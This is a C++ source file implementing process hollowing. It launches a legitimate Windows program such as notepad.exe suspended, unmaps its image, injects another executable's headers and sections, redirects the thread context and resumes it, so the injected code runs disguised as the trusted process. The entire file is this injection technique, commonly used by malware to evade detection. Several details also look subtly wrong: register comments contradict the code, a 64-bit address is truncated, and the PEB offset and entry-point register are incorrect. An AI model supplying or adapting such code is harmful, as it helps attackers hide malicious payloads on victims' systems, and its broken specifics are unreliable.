#include <windows.h>
#include <iostream>
#include <string>

// Helper function to handle errors
void ErrorExit(const char* message) {
    std::cerr << message << " Error: " << GetLastError() << std::endl;
    exit(1);
}

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
    GetModuleHandleA("ntdll.dll"),
    "NtUnmapViewOfSection"
);

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <legitimate_process> <process_to_inject>" << std::endl;
        std::cout << "Example: " << argv[0] << " C:\\Windows\\System32\\notepad.exe C:\\path\\to\\my_app.exe" << std::endl;
        return 1;
    }

    std::string targetProcess = argv[1];    // Legitimate file
    std::string sourceProcess = argv[2];    // File to be injected

    // Step 1: Read the executable file to inject
    std::cout << "\nStep 1: Reading the executable file to inject..." << std::endl;

    HANDLE sourceFile = CreateFileA(sourceProcess.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (sourceFile == INVALID_HANDLE_VALUE) {
        ErrorExit("Could not open source file");
    }

    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), 0, sourceFileSize);

    DWORD bytesRead = 0;
    if (!ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, &bytesRead, NULL)) {
        ErrorExit("Could not read source file");
    }

    CloseHandle(sourceFile);

    // Step 2: Analyze the PE headers
    std::cout << "Step 2: Analyzing PE headers of the executable to inject..." << std::endl;

    PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)sourceFileBytesBuffer + sourceImageDOSHeader->e_lfanew);

    std::cout << "  - Entry point: 0x" << std::hex << sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "  - Image base address: 0x" << std::hex << sourceImageNTHeaders->OptionalHeader.ImageBase << std::endl;

    // Step 3: Create legitimate process in suspended state
    std::cout << "\nStep 3: Creating legitimate process in suspended state..." << std::endl;

    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);

    if (!CreateProcessA(
        targetProcess.c_str(),     // Name of process to create
        NULL,                      // Command line parameters
        NULL,                      // Process security attributes
        NULL,                      // Thread security attributes
        FALSE,                     // Handle inheritance
        CREATE_SUSPENDED,          // Creation flags - SUSPENDED
        NULL,                      // Process environment
        NULL,                      // Current directory
        &startupInfo,              // Startup information
        &processInfo               // Process information
    )) {
        ErrorExit("Could not create legitimate process");
    }

    std::cout << "  - Process created with PID: " << processInfo.dwProcessId << std::endl;

    // Step 4: Get the base address of the legitimate process
    std::cout << "\nStep 4: Getting information about the legitimate process..." << std::endl;

    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(processInfo.hThread, &context)) {
        ErrorExit("Could not get thread context");
    }

    // In x86, the EBX register points to the PEB
    DWORD pebAddress = context.Rbx;

    // The process base address is at offset 0x8 of the PEB
    LPVOID imageBaseAddress = 0;
    SIZE_T bytesRead2 = 0;

    if (!ReadProcessMemory(
        processInfo.hProcess,
        (LPVOID)(pebAddress + 8),
        &imageBaseAddress,
        sizeof(LPVOID),
        &bytesRead2
    )) {
        ErrorExit("Could not read process base address");
    }

    std::cout << "  - Base address of legitimate process: 0x" << std::hex << (DWORD_PTR)imageBaseAddress << std::endl;

    // Step 5: Unmap memory from legitimate process
    std::cout << "\nStep 5: Unmapping memory from legitimate process..." << std::endl;

    if (!NtUnmapViewOfSection(
        processInfo.hProcess,
        imageBaseAddress
    )) {
        std::cout << "  - Memory unmapped successfully" << std::endl;
    }
    else {
        ErrorExit("Could not unmap process memory");
    }

    // Step 6: Allocate new memory in legitimate process
    std::cout << "\nStep 6: Allocating new memory in legitimate process..." << std::endl;

    LPVOID newBaseAddress = VirtualAllocEx(
        processInfo.hProcess,
        (LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase),
        sourceImageNTHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!newBaseAddress) {
        ErrorExit("Could not allocate memory in legitimate process");
    }

    std::cout << "  - New memory allocated at: 0x" << std::hex << (DWORD_PTR)newBaseAddress << std::endl;

    // Step 7: Write PE headers to legitimate process
    std::cout << "\nStep 7: Writing PE headers to legitimate process..." << std::endl;

    if (!WriteProcessMemory(
        processInfo.hProcess,
        newBaseAddress,
        sourceFileBytesBuffer,
        sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        ErrorExit("Could not write PE headers");
    }

    // Step 8: Write PE sections to legitimate process
    std::cout << "\nStep 8: Writing PE sections to legitimate process..." << std::endl;

    PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
        (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
        );

    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
        std::cout << "  - Writing section: " << sourceImageSectionHeader->Name << std::endl;

        LPVOID sectionDestination = (LPVOID)(
            (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
            );

        LPVOID sectionSource = (LPVOID)(
            (DWORD_PTR)sourceFileBytesBuffer + sourceImageSectionHeader->PointerToRawData
            );

        if (!WriteProcessMemory(
            processInfo.hProcess,
            sectionDestination,
            sectionSource,
            sourceImageSectionHeader->SizeOfRawData,
            NULL
        )) {
            ErrorExit("Could not write a PE section");
        }

        sourceImageSectionHeader++;
    }

    // Step 9: Update thread context to point to the new entry point
    std::cout << "\nStep 9: Updating thread context..." << std::endl;

    context.Rbx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(processInfo.hThread, &context)) {
        ErrorExit("Could not set thread context");
    }

    std::cout << "  - New entry point: 0x" << std::hex << context.Rbx << std::endl;

    // Step 10: Resume execution of legitimate process
    std::cout << "\nStep 10: Resuming process execution..." << std::endl;

    if (ResumeThread(processInfo.hThread) == -1) {
        ErrorExit("Could not resume thread");
    }

    std::cout << "  - Process resumed successfully" << std::endl;

    // Free resources
    HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    return 0;
}
